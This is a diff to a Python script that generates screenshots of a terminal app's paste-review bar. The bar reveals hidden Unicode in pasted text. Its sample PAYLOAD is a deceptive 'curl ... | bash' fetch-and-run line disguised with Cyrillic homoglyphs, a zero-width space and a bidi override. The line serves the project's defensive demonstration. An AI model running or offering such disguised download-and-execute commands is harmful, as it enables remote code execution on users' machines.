@@ -9,11 +9,11 @@
 The bar is the real one the app shows -- secure_terminal.review.ReviewBar --
 fed a representative hostile paste (a curl | bash line whose domain and shell name
 hide Cyrillic homoglyphs, plus a zero-width and a bidi override), so the summary,
-the single mirror pane (which reuses the terminal's renderer in the tab's detail
-mode, naming each hidden character inline) and the countdown-gated buttons appear
-exactly as a user sees them. Used to generate the shot on the project's Pages
-site; run it again to regenerate. No display is needed: it uses Qt's offscreen
-platform and grab().
+the single editable REVEALED box (which reuses the terminal's renderer in the tab's
+detail mode, naming each hidden look-alike inline), the transform buttons and the
+countdown-gated Deliver button appear exactly as a user sees them. Used to generate
+the shot on the project's Pages site; run it again to regenerate. No display is
+needed: it uses Qt's offscreen platform and grab().
 
 It imports the app (secure_terminal.review), so run it against an installed
 secure-terminal or point PYTHONPATH at a checkout:
@@ -71,55 +71,46 @@ THEME_NAME = 'light'
 PAYLOAD = ('curl -fsSL https://ex\u0430mple.com/get.sh | b\u0430sh\u200b'
            '  \u202e# trusted mirror\n')
 
-# A non-zero countdown so the shot shows both send buttons disabled and counting
+# A non-zero countdown so the shot shows the Deliver button disabled and counting
 # down -- the anti-fat-finger gate, visible.
 COUNTDOWN_SECONDS = 4
 
-# The delivery mode the shot picks so the mirror renders the DELIVERED form (naming
-# each hidden character inline) instead of the radio-first "choose a mode" hint.
-# 'unicode' (Keep unicode) keeps the printable look-alikes, so the mirror names them;
-# 'stripped' would render pure ASCII, naming nothing -- so 'unicode' is what makes the
-# shot actually demonstrate the unicode detection. shot_generators_smoke_test asserts
-# the mirror shows this render, not the hint.
-DELIVERY_MODE = 'unicode'
-
-# Uniform frame kept around the content after trimming (px). The ReviewBar's
-# preview panes have a 130px minimum height (review.py setMinimumSize) but the
-# shot's payload is one line, so Qt reserves a screenful of empty pane below the
-# text. Grabbing the widget verbatim bakes that in as dead white space; instead
-# the grab is trimmed to the pixels that actually differ from the window
-# background and re-padded with this margin on every side, so the shot is tight
-# and framed consistently with the other top-level shots. Small enough to read as
-# a snug card, large enough not to crowd the content. Scaled with SHOT_SCALE because it is
+# Uniform frame kept around the content after trimming (px). The revealed box has a
+# default multi-line height but the shot's payload is one line, so Qt reserves empty
+# pane below the text. Grabbing the widget verbatim bakes that in as dead white space;
+# instead the grab is trimmed to the pixels that actually differ from the window
+# background and re-padded with this margin on every side, so the shot is tight and
+# framed consistently with the other top-level shots. Small enough to read as a snug
+# card, large enough not to crowd the content. Scaled with SHOT_SCALE because it is
 # applied on the already-scaled (device-pixel) grab, so the frame stays proportional.
 MARGIN = 12 * SHOT_SCALE
 
-# Vertical padding kept inside each preview pane, around its single line of text
-# (px). The panes carry a 130px minimum height (review.py) and default (auto)
-# scrollbars sized for a multi-line paste; the shot's payload is ONE line, so the
-# app leaves a screenful of empty pane -- rendered as bare white space or, when
-# the pane font overflows the pane width, a horizontal scrollbar along the
-# bottom. For the shot each pane is instead sized to its one line with scrollbars
-# off, so the panes read as tight cards. The live app is untouched -- its 130px
-# minimum is right for a real multi-line paste.
+# Vertical padding kept inside the revealed box, around its single line of text (px).
+# The box defaults to a multi-line height and auto scrollbars sized for a multi-line
+# paste; the shot's payload is ONE line, so the app would leave empty pane -- bare
+# white space or a stray scrollbar. For the shot the box is instead sized to its one
+# line with scrollbars off, so it reads as a tight card. The live app is untouched.
 PANE_INSET = 6
 
 
 class _Term:
     """Minimal stand-in for the tab that held the paste: the bar reads its theme,
-    font and display MODE to render the mirror pane (the terminal's theme, Hack
-    font, detail mode -- so every hidden character is named inline)."""
+    font, zoom and display MODE to render the revealed box (the terminal's theme,
+    Hack font, detail mode -- so every hidden look-alike is named inline)."""
     _theme = THEME_NAME
 
     def current_font_family(self):
         return 'Hack'
 
+    def current_zoom(self):
+        return 100
+
     def current_mode(self):
         # detail mode names each hidden character inline -- the most informative
-        # view for the shot, and what the mirror shows when the tab is in detail.
+        # view for the shot, and what the box shows when the tab is in detail.
         return 'detail'
 
-    def dispatch_pending_paste(self, action):
+    def dispatch_pending_paste(self, action, text=None):
         pass
 
 
@@ -196,20 +187,18 @@ def _trim_to_content(image, bg, margin):
 
 def build_review(host, kind, delay):
     """Build the review bar inside `host` for `kind` ('paste'/'copy'), holding the
-    PAYLOAD, and PICK a delivery mode so the mirror renders the DELIVERED form -- naming
-    each hidden character inline in detail mode -- instead of the radio-first "choose a
-    mode" hint. The bar is radio-first: with no mode picked the mirror shows only the
-    hint, which hides the very unicode-revealing render this shot exists to demonstrate.
-    DELIVERY_MODE='unicode' keeps the printable look-alikes so the mirror names them (the
-    strip form would render pure ASCII, naming nothing); it also arms the countdown so the
-    deliver button shows its disabled countdown state. Returns the bar. Factored out so
-    shot_generators_smoke_test can assert the mirror shows the render, not the hint."""
+    PAYLOAD. The box opens in the default keep-printable form -- the printable
+    look-alikes are KEPT and, in the tab's detail mode, NAMED inline (<U+0430 CYRILLIC
+    SMALL LETTER A>), while the zero-width + bidi are dropped -- so the shot shows the
+    box revealing exactly what the paste was hiding, with no mode-pick needed. A paste
+    also arms the countdown, so the Deliver button shows its disabled countdown state.
+    Returns the bar. Factored out so shot_generators_smoke_test can assert the box shows
+    the revealing render."""
     layout = QVBoxLayout(host)
     layout.setContentsMargins(0, 0, 0, 0)
     bar = ReviewBar(host)
     layout.addWidget(bar)
     bar.show_review(_Term(), PAYLOAD, delay, kind)
-    bar._on_radio(DELIVERY_MODE)
     return bar
 
 
@@ -229,25 +218,26 @@ def main(argv):
     host = QWidget()
     bar = build_review(host, kind, delay)
     # Drop the auto scrollbars so the shot has no stray scrollbar. Width sized so
-    # the mirror's inline-expanded line + the button row are roomy (the detail-mode
+    # the box's inline-expanded line + the button row are roomy (the detail-mode
     # <U+XXXX NAME> expansion makes the line long; the word-wrapping summary would
     # otherwise let the layout compress below the content's real width).
-    mirror = bar._mirror
-    mirror.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
-    mirror.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
-    mirror.setMinimumHeight(0)
+    box = bar._editor
+    box.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
+    box.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
+    box.setMinimumHeight(0)
+    box.setMaximumHeight(16777215)        # lift the bar's live cap for the shot sizing
     host.setFixedWidth(1180)
     host.adjustSize()
     host.show()
-    # let the layout settle so the mirror wraps to its final width before grabbing
+    # let the layout settle so the box wraps to its final width before grabbing
     app.processEvents()
     app.processEvents()
-    # Oversize the mirror a few lines and let _trim_to_content cut the dead
+    # Size the box to its one line (+ inset) and let _trim_to_content cut any dead
     # terminal-bg height below the actual content: at 1180 the detail expansion is
     # one line, but the offscreen document layout does not report a usable height,
     # so measuring it would clip. Trim (theme-bg keyed) gives a tight shot without
-    # the fragile measurement. Overrides the app's 120px minimum for the shot only.
-    mirror.setFixedHeight(3 * mirror.fontMetrics().lineSpacing() + 2 * PANE_INSET)
+    # the fragile measurement.
+    box.setFixedHeight(3 * box.fontMetrics().lineSpacing() + 2 * PANE_INSET)
     host.adjustSize()
     app.processEvents()
 
